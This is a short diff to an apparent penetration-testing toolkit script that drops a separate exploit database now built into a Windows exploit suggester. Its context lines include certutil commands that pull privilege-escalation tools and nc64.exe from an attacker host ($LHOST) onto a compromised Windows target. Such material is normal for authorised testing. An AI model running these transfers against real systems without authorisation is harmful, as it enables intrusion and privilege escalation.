@@ -612,7 +612,6 @@ Step 2 - create workspace and transfer tools:
   certutil -urlcache -f http://$LHOST:8000/windows/enum/PrivescCheck.ps1 PrivescCheck.ps1
   certutil -urlcache -f http://$LHOST:8000/windows/enum/PowerUp.ps1 PowerUp.ps1
   certutil -urlcache -f http://$LHOST:8000/windows/enum/windows-exploit-suggester.ps1 windows-exploit-suggester.ps1
-  certutil -urlcache -f http://$LHOST:8000/windows/enum/windows-lpe-db.csv windows-lpe-db.csv
   certutil -urlcache -f http://$LHOST:8000/windows/shells/nc64.exe nc64.exe
 
 PowerShell download fallback:
@@ -1516,7 +1515,6 @@ dl_zip_match windows/enum/accesschk64.exe https://download.sysinternals.com/file
 
 echo "[+] Windows-exploit-suggester (struttonpigeon)..."
 dl windows/enum/windows-exploit-suggester.ps1 https://raw.githubusercontent.com/struttonpigeon/Windows-exploit-suggester/main/windows-exploit-suggester-standalone.ps1
-dl windows/enum/windows-lpe-db.csv https://raw.githubusercontent.com/struttonpigeon/Windows-exploit-suggester/main/windows-lpe-db.csv
 
 banner "WINDOWS PRIVILEGE ESCALATION"
 echo "[+] GodPotato..."
@@ -2567,8 +2565,7 @@ Transfer these to Windows targets after getting a shell.
   Seatbelt.exe            .NET host survey — security config, interesting files
   SharpUp.exe             .NET privesc checks (GhostPack)
   accesschk64.exe         Sysinternals — check service/file/registry permissions
-  windows-exploit-suggester.ps1  Kernel/OS exploit suggester (needs windows-lpe-db.csv)
-  windows-lpe-db.csv      Local privilege escalation database for the exploit suggester
+  windows-exploit-suggester.ps1  Kernel/OS exploit suggester (standalone, DB built in)
 
 Start with: winPEASx64.exe → PrivescCheck.ps1 → windows-exploit-suggester.ps1 → PowerUp.ps1
 EOF
